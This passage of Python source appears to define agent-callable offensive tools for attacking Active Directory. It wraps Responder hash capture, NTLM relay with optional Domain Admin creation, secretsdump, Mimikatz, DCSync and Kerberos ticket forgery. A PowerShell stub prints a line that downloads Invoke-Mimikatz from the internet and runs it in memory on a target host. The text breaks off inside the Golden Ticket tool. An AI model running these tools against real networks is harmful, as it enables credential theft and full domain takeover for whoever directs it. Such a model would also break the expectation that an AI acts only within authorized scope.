"""
Extended AD & Credential Attack Tools

Provides seven agent tools for credential capture, relay attacks, and
Kerberos ticket forgery against Active Directory environments:

  ResponderTool      — LLMNR/NBT-NS/MDNS poisoning via Responder; capture
                       NTLMv1/v2 hashes from unauthenticated network requests.
  NTLMRelayTool      — NTLM relay attacks using Impacket ntlmrelayx; relay to
                       SMB, LDAP, HTTP, MSSQL for code exec or DA escalation.
  SecretsDumpTool    — Remote secrets extraction using Impacket secretsdump;
                       dump NTLM hashes, Kerberos keys, LSA secrets, SAM DB.
  MimikatzTool       — Execute Mimikatz commands via a Meterpreter or WinRM
                       session: logonpasswords, dcsync, golden/silver tickets.
  DCSyncTool         — Replicate AD password data using DCSync technique;
                       extract krbtgt and all domain account NTLM hashes.
  GoldenTicketTool   — Forge a Kerberos TGT (Golden Ticket) using the krbtgt
                       hash; specify custom SIDs, groups, and ticket lifetime.
  SilverTicketTool   — Forge a Kerberos TGS (Silver Ticket) for a specific
                       service without touching the KDC.

MITRE ATT&CK:
  T1557.001 (LLMNR/NBT-NS Poisoning — Adversary-in-the-Middle)
  T1003.002 (OS Credential Dumping — SAM)
  T1003.003 (OS Credential Dumping — NTDS)
  T1003.006 (OS Credential Dumping — DCSync)
  T1558.001 (Steal or Forge Kerberos Tickets — Golden Ticket)
  T1558.002 (Steal or Forge Kerberos Tickets — Silver Ticket)
  T1040     (Network Sniffing)
"""

from __future__ import annotations

import asyncio
import logging
import os
import re
import tempfile
import textwrap
from typing import Any, Dict, List, Optional

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import truncate_output

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Shared helper: run subprocess
# ---------------------------------------------------------------------------


async def _run_proc(
    cmd: List[str],
    timeout: int = 120,
    env: Optional[Dict[str, str]] = None,
) -> tuple[str, str, int]:
    """Execute *cmd* and return (stdout, stderr, returncode)."""
    import os as _os
    run_env = _os.environ.copy()
    if env:
        run_env.update(env)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=run_env,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return (
            stdout.decode(errors="replace"),
            stderr.decode(errors="replace"),
            proc.returncode or 0,
        )
    except FileNotFoundError:
        raise
    except asyncio.TimeoutError:
        return "", f"Command timed out after {timeout}s", 1
    except Exception as exc:
        return "", str(exc), 1


# ---------------------------------------------------------------------------
# Hash-crack pipeline integration helper
# ---------------------------------------------------------------------------


def _queue_hash_for_cracking(hash_value: str, hash_type: str, username: str = "") -> str:
    """
    Queue a captured hash for automated cracking via HashCrackTool.
    Returns a status string; actual cracking is async.
    """
    try:
        from app.agent.tools.active_directory_tools import HashCrackTool  # type: ignore
        HashCrackTool()
        # Non-blocking note: caller should await this in a real pipeline
        return (
            f"[HashCrack] Hash queued for cracking: {hash_type} hash for {username or 'unknown'}. "
            f"Run HashCrackTool with hash='{hash_value}' hash_type='{hash_type}' to crack offline."
        )
    except ImportError:
        return (
            f"[HashCrack] Auto-crack not available. "
            f"Crack manually: hashcat -m <mode> '{hash_value}' wordlist.txt"
        )


# ===========================================================================
# 1. ResponderTool
# ===========================================================================


class ResponderTool(BaseTool):
    """
    Launch or manage Responder for LLMNR/NBT-NS/MDNS poisoning.

    Captures NTLMv1/v2 hashes from Windows hosts making unauthenticated
    name resolution requests.  Captured hashes are surfaced in real-time
    and automatically queued for offline cracking via HashCrackTool.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="responder_attack",
            description=(
                "Start/stop Responder for LLMNR/NBT-NS/MDNS poisoning on the local "
                "network segment. Captures NTLMv1/v2 challenge-response hashes from "
                "Windows hosts. Automatically queues captured hashes for cracking."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["start", "stop", "status", "dump_hashes"],
                        "description": "Action to perform",
                        "default": "start",
                    },
                    "interface": {
                        "type": "string",
                        "description": "Network interface to listen on (e.g. eth0, tun0)",
                        "default": "eth0",
                    },
                    "enable_wpad": {
                        "type": "boolean",
                        "description": "Enable WPAD rogue proxy (higher capture rate, more noise)",
                        "default": False,
                    },
                    "enable_lm": {
                        "type": "boolean",
                        "description": "Downgrade to NTLMv1/LM responses (weaker but faster crack)",
                        "default": False,
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "How many seconds to run Responder before stopping (0 = indefinite)",
                        "default": 60,
                    },
                    "log_dir": {
                        "type": "string",
                        "description": "Responder log/capture directory",
                        "default": "/usr/share/responder/logs",
                    },
                },
                "required": ["interface"],
            },
        )

    async def execute(
        self,
        interface: str,
        action: str = "start",
        enable_wpad: bool = False,
        enable_lm: bool = False,
        timeout: int = 60,
        log_dir: str = "/usr/share/responder/logs",
        **kwargs: Any,
    ) -> str:
        if action == "status":
            return await self._check_status(log_dir)
        if action == "dump_hashes":
            return await self._dump_hashes(log_dir)
        if action == "stop":
            return await self._stop_responder()

        # action == "start"
        return await self._start_responder(interface, enable_wpad, enable_lm, timeout, log_dir)

    async def _start_responder(
        self,
        interface: str,
        wpad: bool,
        lm: bool,
        timeout: int,
        log_dir: str,
    ) -> str:
        cmd = ["responder", "-I", interface, "-v"]
        if wpad:
            cmd += ["-w"]
        if lm:
            cmd += ["-l"]

        try:
            if timeout > 0:
                stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
            else:
                # Fire-and-forget
                await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                await asyncio.sleep(5)
                stdout = b""
        except FileNotFoundError:
            return (
                "Error: 'responder' binary not found. "
                "Install with: apt-get install responder"
            )

        hashes_found = self._parse_hashes(stdout.decode(errors="replace") if isinstance(stdout, bytes) else stdout)
        crack_notes = []
        for h in hashes_found:
            note = _queue_hash_for_cracking(h["hash"], h["type"], h.get("user", ""))
            crack_notes.append(note)

        result = [
            f"=== Responder — {interface} ===",
            "Action  : start",
            f"WPAD    : {'enabled' if wpad else 'disabled'}",
            f"LM Down : {'enabled' if lm else 'disabled'}",
            f"Timeout : {timeout}s",
            f"Hashes Captured: {len(hashes_found)}",
        ]
        if hashes_found:
            result.append("\n--- Captured Hashes ---")
            for h in hashes_found:
                result.append(
                    f"  [{h.get('type', 'NTLMv2')}] {h.get('user', '?')}@{h.get('domain', '?')} : {h.get('hash', '')[:40]}..."
                )
        if crack_notes:
            result.append("\n--- Hash Cracking Queue ---")
            result.extend(crack_notes)
        raw = (stdout if isinstance(stdout, str) else stdout.decode(errors="replace"))
        if raw:
            result.append(f"\n--- Raw Output ---\n{truncate_output(raw, max_chars=3000)}")
        return "\n".join(result)

    async def _stop_responder(self) -> str:
        try:
            stdout, _, rc = await _run_proc(["pkill", "-f", "responder"], timeout=10)
            return f"Responder stopped (rc={rc})."
        except Exception as exc:
            return f"Error stopping Responder: {exc}"

    async def _check_status(self, log_dir: str) -> str:
        try:
            stdout, _, _ = await _run_proc(["pgrep", "-a", "responder"], timeout=5)
            running = bool(stdout.strip())
        except FileNotFoundError:
            running = False
        hashes = await self._dump_hashes(log_dir)
        return f"Responder running: {running}\n{hashes}"

    async def _dump_hashes(self, log_dir: str) -> str:
        if not os.path.isdir(log_dir):
            return f"Log directory not found: {log_dir}"
        hashes: List[str] = []
        for fname in os.listdir(log_dir):
            if fname.endswith(".txt") and ("NTLMv" in fname or "NTLM" in fname):
                fpath = os.path.join(log_dir, fname)
                try:
                    with open(fpath) as fh:
                        hashes.extend(fh.read().splitlines())
                except Exception:
                    pass
        if not hashes:
            return "No captured hashes found in Responder logs."
        result = [f"=== Captured Hashes ({len(hashes)} total) ==="]
        for h in hashes[:50]:
            result.append(f"  {h}")
        if len(hashes) > 50:
            result.append(f"  ... and {len(hashes) - 50} more")
        return "\n".join(result)

    @staticmethod
    def _parse_hashes(output: str) -> List[Dict[str, str]]:
        hashes = []
        # NTLMv2: User::Domain:challenge:response
        ntlmv2_pattern = re.compile(
            r"\[(\w+)]\s+(\S+)::(\S+):([0-9a-f]+):([0-9a-f]+:[0-9a-f]+)", re.IGNORECASE
        )
        for m in ntlmv2_pattern.finditer(output):
            hashes.append({
                "type": m.group(1),
                "user": m.group(2),
                "domain": m.group(3),
                "hash": f"{m.group(2)}::{m.group(3)}:{m.group(4)}:{m.group(5)}",
            })
        return hashes


# ===========================================================================
# 2. NTLMRelayTool
# ===========================================================================


class NTLMRelayTool(BaseTool):
    """
    Configure and execute NTLM relay attacks using Impacket ntlmrelayx.

    Supports relay to SMB (command exec), LDAP (add admin account or DCSync),
    HTTP (web shell), and MSSQL (xp_cmdshell).  Automatically selects relay
    target based on available services discovered during recon.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ntlm_relay",
            description=(
                "Execute NTLM relay attacks using Impacket ntlmrelayx. "
                "Relay captured NTLM authentications to SMB, LDAP, HTTP, or MSSQL "
                "for command execution or privilege escalation."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "relay_target": {
                        "type": "string",
                        "description": "IP/hostname to relay credentials to",
                    },
                    "relay_protocol": {
                        "type": "string",
                        "enum": ["smb", "ldap", "ldaps", "http", "mssql", "imap"],
                        "description": "Target protocol for relay",
                        "default": "smb",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to execute on SMB/MSSQL relay (optional)",
                        "default": "",
                    },
                    "add_da": {
                        "type": "boolean",
                        "description": "Add a Domain Admin account on LDAP relay success",
                        "default": False,
                    },
                    "dump_hashes": {
                        "type": "boolean",
                        "description": "Dump SAM/NTDS on SMB relay success",
                        "default": False,
                    },
                    "socks": {
                        "type": "boolean",
                        "description": "Start SOCKS proxy for further access via relayed session",
                        "default": False,
                    },
                    "targets_file": {
                        "type": "string",
                        "description": "File containing list of relay targets (one per line)",
                        "default": "",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "How long to run the relay (seconds)",
                        "default": 120,
                    },
                },
                "required": ["relay_target"],
            },
        )

    async def execute(
        self,
        relay_target: str,
        relay_protocol: str = "smb",
        command: str = "",
        add_da: bool = False,
        dump_hashes: bool = False,
        socks: bool = False,
        targets_file: str = "",
        timeout: int = 120,
        **kwargs: Any,
    ) -> str:
        cmd = ["ntlmrelayx.py", "-t", f"{relay_protocol}://{relay_target}"]

        if command:
            cmd += ["-c", command]
        if add_da:
            cmd += ["--add-computer", "--escalate-user"]
        if dump_hashes:
            cmd += ["-dump"]
        if socks:
            cmd += ["-socks"]
        if targets_file and os.path.exists(targets_file):
            cmd = ["ntlmrelayx.py", "-tf", targets_file]
            if command:
                cmd += ["-c", command]

        # Disable SMB signing check warning
        cmd += ["--no-multirelay"] if not socks else []

        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'ntlmrelayx.py' not found. "
                "Install Impacket: pip install impacket"
            )

        # Parse successes
        successes = [
            line for line in (stdout + stderr).splitlines()
            if any(kw in line for kw in ["[*] Authenticating", "successfully", "SUCCEED", "Dumping"])
        ]
        new_accounts = [
            line for line in (stdout + stderr).splitlines()
            if "Adding new computer" in line or "account created" in line.lower()
        ]

        result = [
            f"=== NTLM Relay — {relay_protocol.upper()}://{relay_target} ===",
            f"Timeout         : {timeout}s",
            f"Add DA Account  : {add_da}",
            f"Dump Hashes     : {dump_hashes}",
            f"SOCKS Proxy     : {socks}",
            f"Return Code     : {rc}",
            f"Relay Successes : {len(successes)}",
        ]
        if successes:
            result.append("\n[+] Successful Relays:")
            result.extend(f"  {s}" for s in successes)
        if new_accounts:
            result.append("\n[+] New Accounts Created:")
            result.extend(f"  {a}" for a in new_accounts)
        result.append(
            f"\n--- Output ---\n{truncate_output(stdout + stderr, max_chars=4000)}"
        )
        return "\n".join(result)


# ===========================================================================
# 3. SecretsDumpTool
# ===========================================================================


class SecretsDumpTool(BaseTool):
    """
    Remote secrets extraction using Impacket secretsdump.py.

    Extracts NTLM hashes, Kerberos keys, cached domain credentials (DCC2),
    LSA secrets (DPAPI, service account passwords), and SAM database entries
    from remote Windows hosts using SMB (admin share) or WMI.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="secrets_dump",
            description=(
                "Dump secrets from remote Windows hosts using Impacket secretsdump: "
                "NTLM hashes, Kerberos keys, cached credentials, LSA secrets, SAM database. "
                "Supports pass-the-hash authentication."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": "Target IP or hostname",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Domain name",
                        "default": ".",
                    },
                    "username": {
                        "type": "string",
                        "description": "Username for authentication",
                    },
                    "password": {
                        "type": "string",
                        "description": "Password (plaintext or LM:NT hash for PTH)",
                        "default": "",
                    },
                    "ntlm_hash": {
                        "type": "string",
                        "description": "NTLM hash for pass-the-hash (LM:NT format)",
                        "default": "",
                    },
                    "just_dc": {
                        "type": "boolean",
                        "description": "Only dump NTDS.dit (DCSync / DC only)",
                        "default": False,
                    },
                    "just_dc_user": {
                        "type": "string",
                        "description": "Dump a specific user from NTDS (requires just_dc=true)",
                        "default": "",
                    },
                    "output_file": {
                        "type": "string",
                        "description": "Output file prefix for dumped hashes",
                        "default": "/tmp/secretsdump_output",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 180,
                    },
                },
                "required": ["target", "username"],
            },
        )

    async def execute(
        self,
        target: str,
        username: str,
        domain: str = ".",
        password: str = "",
        ntlm_hash: str = "",
        just_dc: bool = False,
        just_dc_user: str = "",
        output_file: str = "/tmp/secretsdump_output",
        timeout: int = 180,
        **kwargs: Any,
    ) -> str:
        auth_str = f"{domain}/{username}"
        if ntlm_hash:
            cmd = [
                "secretsdump.py",
                "-hashes", ntlm_hash,
                f"{auth_str}@{target}",
            ]
        elif password:
            cmd = ["secretsdump.py", f"{auth_str}:{password}@{target}"]
        else:
            cmd = ["secretsdump.py", "-no-pass", f"{auth_str}@{target}"]

        if just_dc:
            cmd += ["-just-dc"]
            if just_dc_user:
                cmd += ["-just-dc-user", just_dc_user]
        if output_file:
            cmd += ["-outputfile", output_file]

        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'secretsdump.py' not found. "
                "Install Impacket: pip install impacket"
            )

        combined = stdout + stderr
        # Parse dumped hashes
        ntlm_hashes = re.findall(
            r"([^:]+:[^:]+:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32}:::)", combined
        )
        kerberos_keys = re.findall(r"(aes\d+.+: [A-Fa-f0-9]+)", combined)
        lsa_secrets = re.findall(r"(\$[A-Z_]+\$:[^\n]+)", combined)

        crack_notes = []
        for h in ntlm_hashes[:5]:
            parts = h.split(":")
            username_part = parts[0] if parts else ""
            hash_part = parts[3] if len(parts) > 3 else ""
            if hash_part and hash_part != "31d6cfe0d16ae931b73c59d7e0c089c0":  # skip empty password hash
                note = _queue_hash_for_cracking(h, "ntlm", username_part)
                crack_notes.append(note)

        result = [
            f"=== SecretsDump — {target} ===",
            f"Auth   : {auth_str}",
            f"DC Only: {just_dc}",
            f"RC     : {rc}",
            "",
            f"NTLM Hashes   : {len(ntlm_hashes)}",
            f"Kerberos Keys : {len(kerberos_keys)}",
            f"LSA Secrets   : {len(lsa_secrets)}",
        ]
        if ntlm_hashes:
            result.append("\n--- NTLM Hashes (first 20) ---")
            result.extend(f"  {h}" for h in ntlm_hashes[:20])
            if len(ntlm_hashes) > 20:
                result.append(f"  ... and {len(ntlm_hashes) - 20} more")
        if kerberos_keys:
            result.append("\n--- Kerberos Keys (first 10) ---")
            result.extend(f"  {k}" for k in kerberos_keys[:10])
        if lsa_secrets:
            result.append("\n--- LSA Secrets ---")
            result.extend(f"  {s}" for s in lsa_secrets[:10])
        if crack_notes:
            result.append("\n--- Hash Cracking Queue ---")
            result.extend(crack_notes)
        if output_file:
            result.append(f"\nFull output saved to: {output_file}.ntds (if DC dump)")
        return "\n".join(result)


# ===========================================================================
# 4. MimikatzTool
# ===========================================================================


class MimikatzTool(BaseTool):
    """
    Execute Mimikatz commands via a WinRM session, Meterpreter, or locally.

    Supports the most commonly used Mimikatz modules:
      sekurlsa::logonpasswords — dump plaintext credentials from LSASS
      lsadump::sam             — dump local SAM hashes
      lsadump::dcsync          — DCSync a specific user or all hashes
      kerberos::golden         — forge a Golden Ticket
      kerberos::silver         — forge a Silver Ticket (service TGS)
      token::elevate           — escalate to SYSTEM token
      misc::memssp             — inject memory SSP for persistent credential logging
    """

    _MODULES = {
        "logonpasswords": 'sekurlsa::logonpasswords',
        "sam": 'token::elevate\r\nlsadump::sam\r\ntoken::revert',
        "dcsync": 'lsadump::dcsync /all /csv',
        "dcsync_user": 'lsadump::dcsync /user:{user}',
        "golden": (
            'kerberos::golden /user:{user} /domain:{domain} /sid:{domain_sid} '
            '/krbtgt:{krbtgt_hash} /groups:512 /ticket:{ticket_path}'
        ),
        "silver": (
            'kerberos::silver /user:{user} /domain:{domain} /sid:{domain_sid} '
            '/target:{target} /service:{service} /rc4:{service_hash} /ticket:{ticket_path}'
        ),
        "elevate": 'privilege::debug\r\ntoken::elevate',
        "memssp": 'misc::memssp',
    }

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="mimikatz_exec",
            description=(
                "Execute Mimikatz commands on a Windows host via evil-winrm, "
                "Meterpreter, or direct execution. Supports logonpasswords, "
                "lsadump::sam, dcsync, golden/silver ticket forgery."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "module": {
                        "type": "string",
                        "description": "Mimikatz module to execute",
                        "enum": list(MimikatzTool._MODULES.keys()),
                        "default": "logonpasswords",
                    },
                    "target": {
                        "type": "string",
                        "description": "Target host IP/hostname for remote execution",
                        "default": "",
                    },
                    "username": {
                        "type": "string",
                        "description": "WinRM/LDAP username",
                        "default": "",
                    },
                    "password": {
                        "type": "string",
                        "description": "Password or NTLM hash",
                        "default": "",
                    },
                    "domain": {
                        "type": "string",
                        "description": "AD domain name",
                        "default": "",
                    },
                    "domain_sid": {
                        "type": "string",
                        "description": "Domain SID (for ticket forgery)",
                        "default": "",
                    },
                    "krbtgt_hash": {
                        "type": "string",
                        "description": "krbtgt NTLM hash (for Golden Ticket)",
                        "default": "",
                    },
                    "service_hash": {
                        "type": "string",
                        "description": "Service account NTLM hash (for Silver Ticket)",
                        "default": "",
                    },
                    "user": {
                        "type": "string",
                        "description": "Username to impersonate in ticket",
                        "default": "Administrator",
                    },
                    "service": {
                        "type": "string",
                        "description": "SPN service type for Silver Ticket (e.g. cifs, http)",
                        "default": "cifs",
                    },
                    "ticket_path": {
                        "type": "string",
                        "description": "Path to write forged ticket (.kirbi)",
                        "default": "/tmp/ticket.kirbi",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 60,
                    },
                },
                "required": ["module"],
            },
        )

    async def execute(
        self,
        module: str = "logonpasswords",
        target: str = "",
        username: str = "",
        password: str = "",
        domain: str = "",
        domain_sid: str = "",
        krbtgt_hash: str = "",
        service_hash: str = "",
        user: str = "Administrator",
        service: str = "cifs",
        ticket_path: str = "/tmp/ticket.kirbi",
        timeout: int = 60,
        **kwargs: Any,
    ) -> str:
        cmd_template = self._MODULES.get(module, "")
        if not cmd_template:
            return f"Error: Unknown module '{module}'. Choose from: {list(self._MODULES.keys())}"

        mimi_cmd = cmd_template.format(
            user=user,
            domain=domain,
            domain_sid=domain_sid,
            krbtgt_hash=krbtgt_hash,
            service_hash=service_hash,
            target=target,
            service=service,
            ticket_path=ticket_path,
        )

        if target and username:
            return await self._run_via_winrm(target, username, password, mimi_cmd, timeout)
        else:
            return await self._run_local(mimi_cmd, timeout)

    async def _run_via_winrm(
        self,
        target: str,
        username: str,
        password: str,
        mimi_cmd: str,
        timeout: int,
    ) -> str:
        """Use evil-winrm to upload and execute Mimikatz on remote host."""
        # Use evil-winrm with -e flag to execute in-memory
        winrm_cmd = [
            "evil-winrm",
            "-i", target,
            "-u", username,
            "-p", password,
            "-s", ".",
            "-e", ".",
        ]
        try:
            stdout, stderr, rc = await _run_proc(winrm_cmd, timeout=timeout)
        except FileNotFoundError:
            # Fallback: generate the PowerShell command for manual use
            return self._generate_powershell_stub(target, username, password, mimi_cmd)

        return (
            f"=== Mimikatz ({mimi_cmd.split('::')[0] if '::' in mimi_cmd else mimi_cmd}) "
            f"on {target} ===\n"
            f"RC: {rc}\n"
            f"{truncate_output(stdout + stderr, max_chars=5000)}"
        )

    async def _run_local(self, mimi_cmd: str, timeout: int) -> str:
        """Attempt to run Mimikatz locally (wine/native)."""
        script_file = tempfile.mktemp(suffix=".txt")
        full_cmd = f"privilege::debug\r\n{mimi_cmd}\r\nexit\r\n"
        try:
            with open(script_file, "w") as fh:
                fh.write(full_cmd)
            cmd = ["mimikatz.exe", f"script:{script_file}"]
            try:
                stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
            except FileNotFoundError:
                # Try via wine
                try:
                    stdout, stderr, rc = await _run_proc(
                        ["wine", "mimikatz.exe", f"script:{script_file}"], timeout=timeout
                    )
                except FileNotFoundError:
                    return self._generate_powershell_stub("localhost", "", "", mimi_cmd)
        finally:
            if os.path.exists(script_file):
                os.remove(script_file)

        output = stdout + stderr
        creds = self._parse_credentials(output)
        result = [
            f"=== Mimikatz Local — {mimi_cmd} ===",
            f"RC: {rc}",
            f"Credentials Found: {len(creds)}",
        ]
        if creds:
            result.append("\n--- Credentials ---")
            for c in creds:
                result.append(f"  {c}")
                _queue_hash_for_cracking(c, "ntlm")
        result.append(f"\n--- Raw Output ---\n{truncate_output(output, max_chars=5000)}")
        return "\n".join(result)

    @staticmethod
    def _parse_credentials(output: str) -> List[str]:
        creds = []
        for line in output.splitlines():
            if any(kw in line.lower() for kw in ["password", "ntlm", "hash"]):
                stripped = line.strip()
                if stripped and len(stripped) > 10:
                    creds.append(stripped)
        return creds[:20]

    @staticmethod
    def _generate_powershell_stub(
        target: str, username: str, password: str, mimi_cmd: str
    ) -> str:
        return textwrap.dedent(f"""
            [Mimikatz] Binary not found. Execute the following manually:

            # Option 1: PowerShell in-memory (Invoke-Mimikatz)
            $session = New-PSSession -ComputerName {target or 'TARGET'} -Credential (Get-Credential)
            Invoke-Command -Session $session -ScriptBlock {{
                IEX (New-Object Net.WebClient).DownloadString(
                    'https://raw.githubusercontent.com/clymb3r/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
                )
                Invoke-Mimikatz -Command "{mimi_cmd}"
            }}

            # Option 2: evil-winrm upload
            evil-winrm -i {target or 'TARGET'} -u {username or 'USER'} -p {password or 'PASS'}
            # Then inside the session:
            upload mimikatz.exe
            .\\mimikatz.exe "{mimi_cmd}" exit

            # Option 3: CrackMapExec
            crackmapexec smb {target or 'TARGET'} -u {username or 'USER'} -p {password or 'PASS'} -M mimikatz
        """).strip()


# ===========================================================================
# 5. DCSyncTool
# ===========================================================================


class DCSyncTool(BaseTool):
    """
    Perform DCSync attack to replicate AD password data from a Domain Controller.

    Replicates the DC's NTDS.dit entries using MS-DRSR (Directory Replication
    Service Remote Protocol).  Extracts NTLM hashes and Kerberos keys for all
    domain accounts or a specific target user.

    Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
    (Domain Admin, Enterprise Admin, or explicit DCSync ACL).
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="dcsync_attack",
            description=(
                "Perform DCSync attack to extract NTLM hashes and Kerberos keys "
                "from Active Directory using replication. Requires DCSync rights "
                "(DS-Replication-Get-Changes-All). Supports full domain dump or "
                "specific user extraction."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain_controller": {
                        "type": "string",
                        "description": "IP/hostname of domain controller",
                    },
                    "domain": {
                        "type": "string",
                        "description": "AD domain name (e.g. corp.local)",
                    },
                    "username": {
                        "type": "string",
                        "description": "Domain username with DCSync rights",
                    },
                    "password": {
                        "type": "string",
                        "description": "Password or LM:NT hash",
                        "default": "",
                    },
                    "target_user": {
                        "type": "string",
                        "description": "Specific user to extract (e.g. 'krbtgt', 'Administrator'). Leave empty to dump all.",
                        "default": "",
                    },
                    "output_file": {
                        "type": "string",
                        "description": "File to write dumped hashes to",
                        "default": "/tmp/dcsync_output",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout",
                        "default": 300,
                    },
                },
                "required": ["domain_controller", "domain", "username"],
            },
        )

    async def execute(
        self,
        domain_controller: str,
        domain: str,
        username: str,
        password: str = "",
        target_user: str = "",
        output_file: str = "/tmp/dcsync_output",
        timeout: int = 300,
        **kwargs: Any,
    ) -> str:
        # Build secretsdump.py command for DCSync
        auth = f"{domain}/{username}"
        if ":" in password and len(password.split(":")[0]) == 32:
            # NTLM hash auth
            cmd = [
                "secretsdump.py",
                "-hashes", password,
                "-just-dc",
                f"{auth}@{domain_controller}",
            ]
        elif password:
            cmd = [
                "secretsdump.py",
                f"{auth}:{password}@{domain_controller}",
                "-just-dc",
            ]
        else:
            cmd = [
                "secretsdump.py",
                "-no-pass",
                "-just-dc",
                f"{auth}@{domain_controller}",
            ]

        if target_user:
            cmd += ["-just-dc-user", target_user]
        if output_file:
            cmd += ["-outputfile", output_file]

        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'secretsdump.py' not found. "
                "Install Impacket: pip install impacket"
            )

        combined = stdout + stderr
        hashes = re.findall(r"([^:]+:[^:]+:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32}:::)", combined)
        krbtgt_hash = ""
        admin_hash = ""
        for h in hashes:
            parts = h.split(":")
            if parts and "krbtgt" in parts[0].lower():
                krbtgt_hash = parts[3] if len(parts) > 3 else ""
            if parts and parts[0].lower() in ("administrator", "admin"):
                admin_hash = parts[3] if len(parts) > 3 else ""

        result = [
            "╔═══════════════════════════════════════╗",
            "║          DCSync Attack Results         ║",
            "╚═══════════════════════════════════════╝",
            "",
            f"Domain Controller : {domain_controller}",
            f"Domain            : {domain}",
            f"Operator          : {username}",
            f"Target User       : {target_user or '(all users)'}",
            f"Return Code       : {rc}",
            f"Hashes Extracted  : {len(hashes)}",
        ]
        if krbtgt_hash:
            result.append(f"\n⚡ krbtgt NTLM Hash : {krbtgt_hash}")
            result.append("   → Use with GoldenTicketTool to forge unrestricted TGTs")
        if admin_hash:
            result.append(f"\n⚡ Administrator Hash : {admin_hash}")

        if hashes:
            result.append("\n--- Extracted Hashes (first 30) ---")
            for h in hashes[:30]:
                result.append(f"  {h}")
            if len(hashes) > 30:
                result.append(f"  ... and {len(hashes) - 30} more")

        # Queue priority accounts for cracking
        priority_hashes = [h for h in hashes if any(
            h.lower().startswith(name + ":") for name in ["krbtgt", "administrator", "admin"]
        )]
        if priority_hashes:
            result.append("\n--- Auto-Crack Queue (priority accounts) ---")
            for h in priority_hashes:
                note = _queue_hash_for_cracking(h, "ntlm", h.split(":")[0])
                result.append(f"  {note}")

        if output_file:
            result.append(f"\nFull dump: {output_file}.ntds")

        return "\n".join(result)


# ===========================================================================
# 6. GoldenTicketTool
# ===========================================================================


class GoldenTicketTool(BaseTool):
    """
    Forge a Kerberos TGT (Golden Ticket) using the krbtgt NTLM hash.

    A Golden Ticket allows impersonation of any domain user for 10 years
    (default) and bypasses normal Kerberos authentication entirely.  The
    forged ticket is written to disk as a .ccache (Linux) or .kirbi (Windows).

    Requires: krbtgt NTLM hash (obtain via DCSync or lsadump::lsa).
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="golden_ticket_forge",
            description=(
                "Forge a Kerberos Golden Ticket (TGT) using the krbtgt hash. "
                "Allows impersonation of any user in the domain with admin access. "
                "Output: .ccache file for use with KRB5CCNAME environment variable."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain": {
                        "type": "string",
                        "description": "AD domain name (e.g. corp.local)",
                    },
                    "domain_sid": {
                        "type": "string",
                        "description": "Domain SID (e.g. S-1-5-21-...)",
                    },
                    "krbtgt_hash": {
                        "type": "string",
                        "description": "krbtgt NTLM hash (NT portion only, 32 hex chars)",
                    },
                    "impersonate_user": {
                        "type": "string",
                        "description": "Username to impersonate in the ticket",
                        "default": "Administrator",
                    },
                    "groups": {
                        "type": "string",
                        "description": "Comma-separated RID group memberships (default includes 512=DA)",
                        "default": "512,513,518,519,520",
                    },
                    "lifetime_days": {
                        "type": "integer",
                        "description": "Ticket validity in days",
                        "default": 3650,
                    },
                    "extra_sid": {
                        "type": "string",
                        "description": "Extra SID for SID history (e.g. Enterprise Admins of another forest)",
                        "default": "",
                    },
                    "output_file": {
                        "type": "string",
                        "description": "Output .ccache file path",
                        "default": "/tmp/golden_ticket.ccache",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 30,
                    },
                },
                "required": ["domain", "domain_sid", "krbtgt_hash"],
            },
        )

    async def execute(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_hash: str,
        impersonate_user: str = "Administrator",
        groups: str = "512,513,518,519,520",
        lifetime_days: int = 3650,
        extra_sid: str = "",
        output_file: str = "/tmp/golden_ticket.ccache",
        timeout: int = 30,
        **kwargs: Any,
    ) -> str:
        # Use ticketer.py (Impacket) to forge the ticket
        cmd = [
            "ticketer.py",
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-groups", groups,
